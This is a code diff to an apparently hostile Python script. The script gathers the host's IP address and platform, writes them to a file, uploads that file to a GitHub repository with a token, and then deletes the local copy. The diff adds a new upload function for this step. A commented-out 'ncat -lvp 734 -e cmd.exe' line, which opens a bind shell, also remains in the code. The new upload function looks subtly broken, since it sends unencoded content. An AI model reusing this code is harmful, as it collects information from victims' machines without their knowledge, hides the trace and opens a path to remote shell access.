@@ -15,6 +15,23 @@ def delete_file(file_path):
 
 token = os.environ.get('MY_GITHUB_TOKEN')
 
+def update_file_on_github(file_path):
+    url = f"https://api.github.com/repos/kaki714/Not/contents/data/info.txt"
+    headers = {
+        "Authorization": f"token {token}",
+        "Accept": "application/vnd.github.v3+json"
+    }
+
+    with open(file_path, "r") as file:
+        content = file.read()
+        data = {
+            "message": "Actualizar contenido del archivo",
+            "content": content
+        }
+        response = requests.put(url, headers=headers, json=data)
+
+    print(response.status_code)
+
 
 def subir_archivo( nombre_archivo, contenido_archivo):
     url = f"https://api.github.com/repos/kaki714/Not/contents/data/{nombre_archivo}"
@@ -64,7 +81,8 @@ def run():
         print('Address ip: ', IPAddr)
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
         create_file("data.txt",stmnt)
-        subir_archivo('data.txt', stmnt )
+        #subir_archivo('data.txt', stmnt )
+        update_file_on_github("data.txt")
         delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
